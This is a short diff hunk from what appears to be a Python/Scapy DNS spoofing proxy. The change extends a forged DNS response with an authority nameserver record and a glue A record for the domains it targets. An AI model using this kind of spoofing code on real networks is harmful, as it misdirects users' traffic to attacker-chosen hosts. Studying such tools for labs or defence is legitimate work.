@@ -52,15 +52,15 @@ def handler(data, addr, socket, dns_ip):
                     DNS(id=original_dns_packet[DNS].id, qr=1, aa=1, qd=original_dns_packet[DNS].qd,
                     nscount=1, arcount=0, ancount=1, qdcount=1,
                     an=DNSRR(rrname=original_dns_packet[DNS].qd.qname, ttl=original_dns_packet[DNS].an.ttl,rdata=to_be_spoofed[url]['ipv4']),
-                    ns=DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns']))
-                    # ar=DNSRR(rrname=to_be_spoofed[url]['ns'], type='A', ttl=1360))
+                    ns=DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns']),
+                    ar=DNSRR(rrname=to_be_spoofed[url]['ns'], type='A', ttl=1360, rdata='1.1.1.1'))
                 print "Spoofed packet", spoofed_dns_packet.show()
                 proxy_response = spoofed_dns_packet
             else:
                 print "Request for %s will NOT be spoofed" % url[:-1]
                 proxy_response = server_response[2:]
-                print type(proxy_response), len(proxy_response)
             print "Sending DNS response to client"
+            print type(proxy_response), len(proxy_response)
             socket.sendto(proxy_response, addr)
             print "Success!"
     else:
